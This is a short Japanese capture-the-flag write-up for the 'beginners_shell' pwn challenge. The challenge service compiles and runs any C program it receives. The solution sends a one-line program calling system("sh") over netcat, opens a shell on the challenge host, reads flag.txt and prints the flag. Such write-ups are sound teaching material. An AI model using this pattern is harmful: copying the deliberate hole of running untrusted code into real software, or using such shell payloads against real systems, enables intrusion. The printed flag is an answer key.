# beginners_shell:Pwn:61pts
C言語を勉強中の「彼」はみんなが教えてくれたプログラムを実行するのが好きみたい！でも彼には秘密があって...。どうにかして秘密の flag を聞き出せないかな？  
```
nc 27.133.155.191 30002
```
[main.c](main.c)　　　　[Makefile](Makefile)  

# Solution
配布された以下のmain.cが動いているようだ。  
```c:main.c
#include<stdio.h>
#include<unistd.h>
#include<stdlib.h>

int main() {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  alarm(60);

  char program[0x1000];

  puts("Enter your program!");
  fgets(program, 0x1000, stdin);

  FILE *fp = fopen("/tmp/program.c", "w");
  fprintf(fp, "%s", program);
  fclose(fp);

  system("rm /tmp/program");
  system("gcc /tmp/program.c -o /tmp/program");
  system("/tmp/program");
  system("rm /tmp/program");
}
```
Cのプログラムを受け取り、実行している。  
以下のようにshを起動するプログラムを送信する。  
```bash
$ nc 27.133.155.191 30002
Enter your program!
main(){system("sh");}
rm: cannot remove '/tmp/program': No such file or directory
/tmp/program.c:1:1: warning: return type defaults to 'int' [-Wimplicit-int]
    1 | main(){system("sh");}
      | ^~~~
/tmp/program.c: In function 'main':
/tmp/program.c:1:8: warning: implicit declaration of function 'system' [-Wimplicit-function-declaration]
    1 | main(){system("sh");}
      |        ^~~~~~
ls
beginners_shell
entry.sh
flag.txt
cat flag.txt
xm4s{Yes!!To_get_SHELL_is_goal}
```
flagが読み取れた。  

## xm4s{Yes!!To_get_SHELL_is_goal}